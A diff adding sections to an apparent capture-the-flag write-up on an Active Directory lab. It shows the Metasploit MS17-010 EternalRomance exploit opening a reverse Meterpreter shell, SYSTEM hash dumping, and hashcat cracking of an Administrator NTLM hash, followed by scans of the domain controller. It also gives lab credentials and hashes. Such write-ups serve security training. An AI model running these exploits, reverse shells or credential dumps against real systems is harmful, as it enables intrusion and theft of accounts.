@@ -679,18 +679,302 @@ From this output, user `ali` only have pemission to write on folder `WebService`
 
 ![](/images/ctf-round-3-active-directory/17.png)
 
+As I know this host ran SMB service, it could be vulnerable to MS17-010 or not. To verify it, I ran `msfconsole` and used `auxiliary/scanner/smb/smb_ms17_010`. This scanner will detect either the host is vulnerable or not.
 
+```
+$ msfconsole
+
+msf6> use auxiliary/scanner/smb/smb_ms17_010
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.240.13
+RHOSTS => 192.168.240.13
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set SMBDomain MYCOMS
+SMBDomain => MYCOMS
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set SMBUser ali
+SMBUser => ali
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set SMBPass P@ssw0rd123!
+SMBPass => P@ssw0rd123!
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+
+[+] 192.168.240.13:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Standard Evaluation 9600 x64 (64-bit)
+[*] 192.168.240.13:445    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Yep, it's vulnerable to MS17-010. This will give me 2 choices:
+
+* MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+* MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+
+`nmap` suggested that this host is Windows 2008 R2 - 2012. EternalBlue can be use against Windows 7 and Windows Server 2008 R2 while EternalRomance works on all OS's up to Windows Server 2016. In this case, I used EternalRomance.
+
+```
+msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_psexec
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 192.168.240.13
+RHOSTS => 192.168.240.13
+msf6 exploit(windows/smb/ms17_010_psexec) > set SERVICE_NAME godek2
+SERVICE_NAME => godek2
+msf6 exploit(windows/smb/ms17_010_psexec) > set SMBDomain MYCOMS
+SMBDomain => MYCOMS
+msf6 exploit(windows/smb/ms17_010_psexec) > set SMBUser ali
+SMBUser => ali
+msf6 exploit(windows/smb/ms17_010_psexec) > set SMBPass P@ssw0rd123!
+SMBPass => P@ssw0rd123!
+msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.0.200.2
+LHOST => 10.0.200.2
+msf6 exploit(windows/smb/ms17_010_psexec) > exploit
+
+[*] Started reverse TCP handler on 10.0.200.2:4444 
+[*] 192.168.240.13:445 - Authenticating to 192.168.240.13 as user 'ali'...
+[*] 192.168.240.13:445 - Target OS: Windows Server 2012 R2 Standard Evaluation 9600
+[*] 192.168.240.13:445 - Built a write-what-where primitive...
+[+] 192.168.240.13:445 - Overwrite complete... SYSTEM session obtained!
+[*] 192.168.240.13:445 - Selecting PowerShell target
+[*] 192.168.240.13:445 - Executing the payload...
+[+] 192.168.240.13:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175174 bytes) to 192.168.240.13
+[*] Meterpreter session 1 opened (10.0.200.2:4444 -> 192.168.240.13:49750) at 2020-11-26 23:31:47 +0800
+
+meterpreter >
+```
+
+Now I'm inside. Firstly, I need to check what user I'm.
+
+```
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+I'm as `SYSTEM`. To get the Administrator's NTLM hash, I used `post/windows/gather/smart_hashdump`, like the previous challenge.
+
+```
+meterpreter > background
+[*] Backgrounding session 1...
+msf6 exploit(windows/smb/ms17_010_psexec) > use post/windows/gather/smart_hashdump
+msf6 post(windows/gather/smart_hashdump) > set SESSION 1
+SESSION => 1
+msf6 post(windows/gather/smart_hashdump) > run
+
+[*] Running module against PROD-FSRV5633
+[*] Hashes will be saved to the database if one is connected.
+[+] Hashes will be saved in loot in JtR password file format to:
+[*] /home/ahmad/.msf4/loot/20201126233811_default_192.168.240.13_windows.hashes_939066.txt
+[*] Dumping password hashes...
+[*] Running as SYSTEM extracting hashes from registry
+[*] 	Obtaining the boot key...
+[*] 	Calculating the hboot key using SYSKEY 0790a788d7c5ef20cb80b176f62f2123...
+[*] 	Obtaining the user list and keys...
+[*] 	Decrypting user keys...
+[*] 	Dumping password hints...
+[*] 	No users with password hints on this system
+[*] 	Dumping password hashes...
+[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:1df71c58e95017fb35169f71a06112f4:::
+[+] 	umar:1002:aad3b435b51404eeaad3b435b51404ee:690202604d171a54bc7d7d06aa90df3f:::
+[*] Post module execution completed
+```
+
+Now that I have the NTLM hash.
+
+**Answer: Administrator:500:aad3b435b51404eeaad3b435b51404ee:1df71c58e95017fb35169f71a06112f4:::**
 
 ### Q4 - NTLM hash result for user "*mar"
 
 ![](/images/ctf-round-3-active-directory/18.png)
 
+Grab the user `umar` NTLM hash from the smart hashdump output.
 
+**Answer: umar:1002:aad3b435b51404eeaad3b435b51404ee:690202604d171a54bc7d7d06aa90df3f:::**
 
 ### Q5 - Plain text password for user Administrator
 
 ![](/images/ctf-round-3-active-directory/19.png)
 
+I've given a hint `P@ssw0rd?a?a?a?a?a?a` which means I only have partial of the plaintext password. In this case, I did mask attack using `Hashcat`. This attack will guess the password via brute forcing.
+
+```
+$ hashcat -m 1000 -a 3 1df71c58e95017fb35169f71a06112f4 'P@ssw0rd?a?a?a?a?a?a'
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-AMD Ryzen 3 2200G with Radeon Vega Graphics, 2890/2954 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+
+Applicable optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Brute-Force
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 65 MB
+
+1df71c58e95017fb35169f71a06112f4:P@ssw0rd123!!!  
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NTLM
+Hash.Target......: 1df71c58e95017fb35169f71a06112f4
+Time.Started.....: Thu Nov 26 23:48:12 2020 (3 secs)
+Time.Estimated...: Thu Nov 26 23:48:15 2020 (0 secs)
+Guess.Mask.......: P@ssw0rd?a?a?a?a?a?a [14]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  3443.3 kH/s (0.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 11149312/735091890625 (0.00%)
+Rejected.........: 0/11149312 (0.00%)
+Restore.Point....: 11145216/735091890625 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: P@ssw0rds[~+++ -> P@ssw0rd8fe234
+
+Started: Thu Nov 26 23:47:30 2020
+Stopped: Thu Nov 26 23:48:17 2020
+```
+
+**Answer: P@ssw0rd123!!!**
+
+## Challenges - Domain Controller
+
+### Q1 - NTLM hash result for user Administrator
+
+I looked into the host's ARP cache using `arp`.
+
+```
+meterpreter > arp
+
+ARP cache
+=========
+
+    IP address       MAC address        Interface
+    ----------       -----------        ---------
+    192.168.240.1    00:0c:29:4c:f2:d9  12
+    192.168.240.30   00:0c:29:3b:05:22  12
+    192.168.240.255  ff:ff:ff:ff:ff:ff  12
+    224.0.0.22       00:00:00:00:00:00  1
+    224.0.0.22       01:00:5e:00:00:16  12
+    224.0.0.252      01:00:5e:00:00:fc  12
+```
+
+I suspected that IP address `192.168.240.30` is the domain controller. This IP address also found in the ARP cache of webserver on `192.168.240.80`.
+
+To verify it, I ran `nmap` on the IP.
+
+```
+$ nmap -Pn 192.168.240.30
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-27 00:04 +08
+Nmap scan report for 192.168.240.30
+Host is up (0.058s latency).
+Not shown: 996 filtered ports
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+```
+
+Domain controller commonly have these ports. I tried to scan again with more options.
+
+```
+$ nmap -Pn -A --script vuln 192.168.240.30
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-27 00:16 +08
+Pre-scan script results:
+| broadcast-avahi-dos: 
+|   Discovered hosts:
+|     224.0.0.251
+|   After NULL UDP avahi packet DoS (CVE-2011-1002).
+|_  Hosts are all up (not vulnerable).
+Nmap scan report for 192.168.240.30
+Host is up (0.056s latency).
+Not shown: 996 filtered ports
+PORT     STATE SERVICE            VERSION
+135/tcp  open  msrpc              Microsoft Windows RPC
+139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MYCOMS)
+3389/tcp open  ssl/ms-wbt-server?
+|_rdp-vuln-ms12-020: ERROR: Script execution failed (use -d to debug)
+| ssl-dh-params: 
+|   VULNERABLE:
+|   Diffie-Hellman Key Exchange Insufficient Group Strength
+|     State: VULNERABLE
+|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
+|       of insufficient strength, especially those using one of a few commonly
+|       shared groups, may be susceptible to passive eavesdropping attacks.
+|     Check results:
+|       WEAK DH GROUP 1
+|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
+|             Modulus Type: Safe prime
+|             Modulus Source: RFC2409/Oakley Group 2
+|             Modulus Length: 1024
+|             Generator Length: 1024
+|             Public Key Length: 1024
+|     References:
+|_      https://weakdh.org
+|_sslv2-drown: 
+Service Info: Host: PROD-AD3211; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 82.37 seconds
+```
+
+`vuln` script suggested that this host is vulnerable to MS17-010 on port 445 and Diffie-Hellman Key Exchange Insufficient Group Strength on port 3389.
+
+I ran `auxiliary/scanner/smb/smb_ms17_010` to this host and it gives this output
+
+```
+msf6 post(windows/gather/smart_hashdump) > use auxiliary/scanner/smb/smb_ms17_010
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.240.30
+RHOSTS => 192.168.240.30
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set SMBDomain MYCOMS
+SMBDomain => MYCOMS
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set SMBUser ali
+SMBUser => ali
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set SMBPass P@ssw0rd123!
+SMBPass => P@ssw0rd123!
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+
+[-] 192.168.240.30:445    - Host does NOT appear vulnerable.
+[*] 192.168.240.30:445    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Host isn't vulnerable to MS17-010. I'm lost hahahhahahah!
 
 
-to be continue ...
+
+### Q2 - NTLM hash result for Enterprise admin user
+
